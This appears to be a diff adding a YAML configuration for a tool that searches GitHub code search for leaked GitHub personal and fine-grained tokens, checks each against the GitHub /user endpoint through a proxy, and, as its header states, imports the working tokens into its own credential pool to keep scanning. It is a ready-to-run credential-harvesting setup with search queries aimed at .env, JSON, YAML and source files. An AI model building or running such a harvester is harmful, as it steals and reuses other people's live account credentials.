@@ -1,0 +1,110 @@
+# GitHub token self-bootstrap scan configuration
+# Scans GitHub API code search for GitHub tokens (prefixes ghp_/gho_/ghu_/ghs_/ghr_/
+# classic tokens and github_pat_ fine-grained tokens), then validates each candidate
+# against GitHub's GET /user endpoint.
+# Self-bootstrap: validated tokens are auto-imported into the web instance's own
+# token store after the scan completes, so the scanner feeds its own credential pool.
+# Results are written to ./data/providers/github/*.txt
+
+global:
+  workspace: "./data"
+  max_retries_requeued: 3
+  proxy: ""
+  github_credentials:
+    sessions:
+      - "your_github_session_here"
+    tokens:
+      - "your_github_token_here"
+    strategy: "round_robin"
+  user_agents:
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+
+pipeline:
+  threads:
+    search: 1
+    gather: 4
+    check: 2
+    inspect: 1
+  queue_sizes:
+    search: 100000
+    gather: 200000
+    check: 500000
+    inspect: 1000000
+
+monitoring:
+  update_interval: 2.0
+  error_threshold: 0.1
+  queue_threshold: 1000000
+  memory_threshold: 1073741824
+  response_threshold: 5.0
+
+persistence:
+  batch_size: 1
+  save_interval: 5
+  queue_interval: 60
+  snapshot_interval: 300
+  auto_restore: true
+  shutdown_timeout: 30
+  format: txt
+
+ratelimits:
+  github_api:
+    base_rate: 0.15
+    burst_limit: 3
+    adaptive: true
+  github:
+    base_rate: 0.2
+    burst_limit: 2
+    adaptive: true
+
+tasks:
+  - name: github
+    enabled: true
+    provider_type: github
+    use_api: true
+    max_pages: 1000
+    search_types: [code]
+    stages:
+      search: true
+      gather: true
+      check: true
+      inspect: true
+    api:
+      base_url: https://api.github.com
+      completion_path: ""
+      model_path: ""
+      default_model: github
+      auth_key: Authorization
+      extra_headers: {}
+      api_version: ""
+      timeout: 15
+      retries: 3
+      use_proxy: true  # GitHub is international — route validation through proxy
+    patterns:
+      key_pattern: "(?:ghp_|gho_|ghu_|ghs_|ghr_)[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}"
+      address_pattern: ""
+      endpoint_pattern: ""
+      model_pattern: ""
+    conditions:
+      - query: '"ghp_"'
+      - query: '"github_pat_"'
+      - query: '"gho_"'
+      - query: '"GITHUB_TOKEN"'
+      - query: '"GITHUB_TOKEN="'
+      - query: '"GH_TOKEN"'
+      - query: '"GITHUB_TOKEN" extension:env'
+      - query: '"github_pat_" extension:env'
+      - query: '"ghp_" extension:json'
+      - query: '"GITHUB_TOKEN" extension:json'
+      - query: '"GITHUB_TOKEN" extension:yaml'
+      - query: '"GITHUB_TOKEN" language:Python'
+      - query: '"GITHUB_TOKEN" language:JavaScript'
+      - query: '"GITHUB_TOKEN" language:Go'
+      - query: '"GH_TOKEN" language:Shell'
+    rate_limit:
+      base_rate: 0.2
+      burst_limit: 2
+      adaptive: true
+    storage:
+      directory: ""
+      plan: ""
